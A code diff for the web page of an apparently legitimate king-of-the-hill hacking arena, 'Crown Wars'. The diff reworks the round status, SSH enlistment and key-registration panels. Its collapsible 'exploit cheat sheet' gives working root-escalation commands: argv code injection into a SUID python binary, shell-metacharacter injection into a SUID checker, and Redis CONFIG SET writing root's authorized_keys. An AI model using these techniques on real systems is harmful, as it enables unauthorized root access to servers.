@@ -136,16 +136,8 @@ export default async function KothPage({
 
       {/* Hero */}
       <header className="space-y-2">
-        <div className="flex items-baseline justify-between gap-3 flex-wrap">
-          <div className="text-[10px] text-amber/80 tracking-[0.4em] uppercase font-mono">
-            ▸ predator arena
-          </div>
-          <Link
-            href="/battles/koth/rules"
-            className="btn-bracket text-amber text-[10px] font-mono tracking-[0.18em]"
-          >
-            Rules
-          </Link>
+        <div className="text-[10px] text-amber/80 tracking-[0.4em] uppercase font-mono">
+          ▸ predator arena
         </div>
         <h1 className="text-amber text-3xl sm:text-4xl phosphor wordmark font-bold tracking-[0.08em]">
           <span className="glitch" data-text="CROWN WARS">
@@ -169,102 +161,132 @@ export default async function KothPage({
         </Link>
       </div>
 
-      {/* Round status banner */}
-      <section className="border border-amber/30 bg-amber/[0.02] px-4 py-3 flex items-center gap-4 flex-wrap text-[11px] font-mono tabular-nums">
-        {state.round ? (
-          <>
-            <span className="flex items-center gap-2">
-              <span className="pulse-dot text-green">●</span>
-              <span className="text-muted uppercase tracking-widest">
-                round live
+      {/* ─── Combined Arena Console ───────────────────────────────
+          Round status strip (top) + enlist / SSH / sign-in (body).
+          Border switches to green when the viewer is enlisted, giving
+          a clear "you're in" identity signal across the whole console. */}
+      <section
+        className={`border ${
+          myKey
+            ? "border-green/40 bg-green/[0.03]"
+            : "border-amber/40 bg-amber/[0.03]"
+        }`}
+      >
+        {/* Round status strip */}
+        <div
+          className={`border-b ${
+            myKey ? "border-green/20" : "border-amber/20"
+          } px-4 py-2.5 flex items-center gap-3 flex-wrap text-[11px] font-mono tabular-nums`}
+        >
+          {state.round ? (
+            <>
+              <span className="flex items-center gap-2">
+                <span className="pulse-dot text-green">●</span>
+                <span className="text-muted uppercase tracking-widest">
+                  round live
+                </span>
               </span>
-            </span>
-            <span className="text-amber">
-              age {fmtDuration(state.round.ageSeconds)} / 20:00
-            </span>
-            <span className="text-muted">·</span>
-            <span className="text-text">
-              resets in {fmtDuration(state.round.remainingSeconds)}
-            </span>
-            <span className="text-muted">·</span>
-            {state.king ? (
-              <span className="text-green">
-                king: {state.king.username} · {fmtDuration(state.king.holdSeconds)}
+              <span className="text-amber">
+                age {fmtDuration(state.round.ageSeconds)} / 20:00
               </span>
-            ) : (
-              <span className="text-muted">crown vacant</span>
-            )}
-          </>
-        ) : (
-          <span className="text-muted">arena resetting · no active round</span>
-        )}
-      </section>
-
-      {/* Registration / SSH command block */}
-      {!user ? (
-        <section className="border border-amber/40 bg-amber/[0.03] px-4 py-3 space-y-2">
-          <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
-            ▸ enlist
-          </div>
-          <p className="text-[13px] text-text">
-            Sign in to register your SSH key and claim a slot in the arena.
-          </p>
-          <Link href="/login?next=/battles/koth" className="btn-bracket text-amber text-[12px] font-mono">
-            Sign in to enlist
-          </Link>
-        </section>
-      ) : myKey ? (
-        <section className="border border-green/40 bg-green/[0.03] px-4 py-3 space-y-2">
-          <div className="flex items-center justify-between gap-3 flex-wrap">
-            <div className="flex items-center gap-2 text-[10px] tracking-[0.3em] uppercase font-mono">
-              <span className="text-green/80">▸ enlisted · slot koth{myKey.slot}</span>
-              {myKey.tutorialCompletedAt ? (
-                <span className="border border-amber/60 text-amber bg-amber/5 px-1 py-0">veteran</span>
+              <span className="text-muted">·</span>
+              <span className="text-text">
+                resets in {fmtDuration(state.round.remainingSeconds)}
+              </span>
+              <span className="text-muted">·</span>
+              {state.king ? (
+                <span className="text-green">
+                  king: {state.king.username} ·{" "}
+                  {fmtDuration(state.king.holdSeconds)}
+                </span>
               ) : (
-                <span className="border border-muted/60 text-muted bg-bg px-1 py-0">rookie · first crown unlocks</span>
+                <span className="text-muted">crown vacant</span>
               )}
-            </div>
-            <span className="text-[10px] text-muted font-mono tabular-nums">
-              {myKey.fingerprint.slice(0, 22)}…
+            </>
+          ) : (
+            <span className="text-muted">
+              arena resetting · no active round
             </span>
-          </div>
-          <pre className="text-[12px] leading-relaxed text-text overflow-x-auto">
-{`ssh -i ~/.ssh/your_key -p ${ARENA_PORT} koth${myKey.slot}@${ARENA_HOST}`}
-          </pre>
-          <p className="text-[11px] text-muted leading-snug">
-            Once inside: get root via the SUID paths or Redis, then
-            <code className="ml-1">crown-claim koth{myKey.slot} &lt;exploit&gt;</code> to claim the throne.
-          </p>
+          )}
+        </div>
 
-          {/* Exploit cheat sheet — collapsible, native <details>, no JS */}
-          <details className="text-[12px] font-mono pt-1.5 border-t border-green/20 mt-2">
-            <summary className="cursor-pointer text-amber hover:text-amber/80 select-none py-1 tracking-wider">
-              ▸ exploit cheat sheet · open at your own risk
-            </summary>
-            <div className="space-y-3 pt-2 pb-1">
-              <div className="space-y-1">
-                <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                  L7 — phantom-python3 SUID · argv code injection
-                </div>
-                <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
+        {/* Body — three states: unsigned / enlisted / sign-in-but-no-key */}
+        {!user ? (
+          <div className="px-4 py-3 space-y-2">
+            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
+              ▸ enlist
+            </div>
+            <p className="text-[13px] text-text">
+              Sign in to register your SSH key and claim a slot in the arena.
+            </p>
+            <Link
+              href="/login?next=/battles/koth"
+              className="btn-bracket text-amber text-[12px] font-mono"
+            >
+              Sign in to enlist
+            </Link>
+          </div>
+        ) : myKey ? (
+          <div className="px-4 py-3 space-y-2">
+            <div className="flex items-center justify-between gap-3 flex-wrap">
+              <div className="flex items-center gap-2 text-[10px] tracking-[0.3em] uppercase font-mono">
+                <span className="text-green/80">
+                  ▸ enlisted · slot koth{myKey.slot}
+                </span>
+                {myKey.tutorialCompletedAt ? (
+                  <span className="border border-amber/60 text-amber bg-amber/5 px-1 py-0">
+                    veteran
+                  </span>
+                ) : (
+                  <span className="border border-muted/60 text-muted bg-bg px-1 py-0">
+                    rookie · first crown unlocks
+                  </span>
+                )}
+              </div>
+              <span className="text-[10px] text-muted font-mono tabular-nums">
+                {myKey.fingerprint.slice(0, 22)}…
+              </span>
+            </div>
+            <pre className="text-[12px] leading-relaxed text-text overflow-x-auto">
+{`ssh -i ~/.ssh/your_key -p ${ARENA_PORT} koth${myKey.slot}@${ARENA_HOST}`}
+            </pre>
+            <p className="text-[11px] text-muted leading-snug">
+              Once inside: get root via the SUID paths or Redis, then
+              <code className="ml-1">
+                crown-claim koth{myKey.slot} &lt;exploit&gt;
+              </code>{" "}
+              to claim the throne.
+            </p>
+
+            {/* Exploit cheat sheet — collapsible, native <details>, no JS */}
+            <details className="text-[12px] font-mono pt-1.5 border-t border-green/20 mt-2">
+              <summary className="cursor-pointer text-amber hover:text-amber/80 select-none py-1 tracking-wider">
+                ▸ exploit cheat sheet · open at your own risk
+              </summary>
+              <div className="space-y-3 pt-2 pb-1">
+                <div className="space-y-1">
+                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
+                    L7 — phantom-python3 SUID · argv code injection
+                  </div>
+                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
 {`/usr/local/bin/phantom-python3 -c \\
   'import os; os.system("crown-claim koth${myKey.slot} l7-suid")'`}
-                </pre>
-              </div>
-              <div className="space-y-1">
-                <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                  L8 — system-checker SUID · shell metachar injection
+                  </pre>
                 </div>
-                <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
+                <div className="space-y-1">
+                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
+                    L8 — system-checker SUID · shell metachar injection
+                  </div>
+                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto">
 {`/usr/local/bin/system-checker \\
   '127.0.0.1; crown-claim koth${myKey.slot} l8-suid'`}
-                </pre>
-              </div>
-              <div className="space-y-1">
-                <div className="text-[10px] text-amber/70 uppercase tracking-widest">
-                  L17 — Redis CONFIG SET · write to /root/.ssh/authorized_keys
+                  </pre>
                 </div>
-                <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
+                <div className="space-y-1">
+                  <div className="text-[10px] text-amber/70 uppercase tracking-widest">
+                    L17 — Redis CONFIG SET · write to /root/.ssh/authorized_keys
+                  </div>
+                  <pre className="text-[11px] text-text bg-amber/[0.04] border border-amber/20 px-2 py-1.5 overflow-x-auto whitespace-pre">
 {`ssh-keygen -t ed25519 -f /tmp/k -N ''
 KEY=$(cat /tmp/k.pub)
 redis-cli <<EOF
@@ -275,61 +297,63 @@ SAVE
 EOF
 ssh -i /tmp/k -o StrictHostKeyChecking=no root@localhost \\
   "crown-claim koth${myKey.slot} l17-redis"`}
-                </pre>
+                  </pre>
+                </div>
+                <p className="text-[10px] text-muted leading-snug pt-1">
+                  These work today. The box mutates against playbooks —
+                  defenders close paths after they&apos;re used. Real opsec
+                  means reading <code className="mx-1">/var/log/auth.log</code>
+                  and adapting in real time, not copy-paste forever.
+                </p>
               </div>
-              <p className="text-[10px] text-muted leading-snug pt-1">
-                These work today. The box mutates against playbooks — defenders
-                close paths after they're used. Real opsec means reading
-                <code className="mx-1">/var/log/auth.log</code>
-                and adapting in real time, not copy-paste forever.
-              </p>
-            </div>
-          </details>
-        </section>
-      ) : (
-        <section className="border border-amber/40 bg-amber/[0.03] px-4 py-3 space-y-3">
-          <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
-            ▸ enlist — register your SSH key
+            </details>
           </div>
-          {params.error && (
-            <div className="text-[12px] text-red-400 font-mono border border-red-400/40 bg-red-400/5 px-2 py-1">
-              ✗ {params.error}
+        ) : (
+          <div className="px-4 py-3 space-y-3">
+            <div className="text-[10px] text-amber/80 tracking-[0.3em] uppercase font-mono">
+              ▸ enlist — register your SSH key
             </div>
-          )}
-          {params.registered === "1" && (
-            <div className="text-[12px] text-green font-mono border border-green/40 bg-green/5 px-2 py-1">
-              ✓ key registered — slot assigned above
-            </div>
-          )}
-          <form action={submitKothKey} className="space-y-2">
-            <label
-              htmlFor="pubkey"
-              className="block text-[11px] text-muted uppercase tracking-widest font-mono"
-            >
-              public key (one line — ssh-ed25519 preferred)
-            </label>
-            <textarea
-              id="pubkey"
-              name="pubkey"
-              rows={3}
-              required
-              placeholder="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... your@host"
-              className="w-full bg-bg border border-amber/30 px-3 py-2 text-[12px] font-mono text-text resize-y focus:outline-none focus:border-amber"
-            />
-            <div className="flex items-center justify-between gap-3 flex-wrap">
-              <span className="text-[10px] text-muted">
-                generate with <code>ssh-keygen -t ed25519</code> · paste the .pub
-              </span>
-              <button
-                type="submit"
-                className="btn-bracket text-amber text-[12px] font-mono"
+            {params.error && (
+              <div className="text-[12px] text-red-400 font-mono border border-red-400/40 bg-red-400/5 px-2 py-1">
+                ✗ {params.error}
+              </div>
+            )}
+            {params.registered === "1" && (
+              <div className="text-[12px] text-green font-mono border border-green/40 bg-green/5 px-2 py-1">
+                ✓ key registered — slot assigned above
+              </div>
+            )}
+            <form action={submitKothKey} className="space-y-2">
+              <label
+                htmlFor="pubkey"
+                className="block text-[11px] text-muted uppercase tracking-widest font-mono"
               >
-                Enlist in Arena
-              </button>
-            </div>
-          </form>
-        </section>
-      )}
+                public key (one line — ssh-ed25519 preferred)
+              </label>
+              <textarea
+                id="pubkey"
+                name="pubkey"
+                rows={3}
+                required
+                placeholder="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... your@host"
+                className="w-full bg-bg border border-amber/30 px-3 py-2 text-[12px] font-mono text-text resize-y focus:outline-none focus:border-amber"
+              />
+              <div className="flex items-center justify-between gap-3 flex-wrap">
+                <span className="text-[10px] text-muted">
+                  generate with <code>ssh-keygen -t ed25519</code> · paste the
+                  .pub
+                </span>
+                <button
+                  type="submit"
+                  className="btn-bracket text-amber text-[12px] font-mono"
+                >
+                  Enlist in Arena
+                </button>
+              </div>
+            </form>
+          </div>
+        )}
+      </section>
 
       {/* Top-5 leaderboard */}
       <section className="border border-border/60 px-4 py-3 space-y-2">
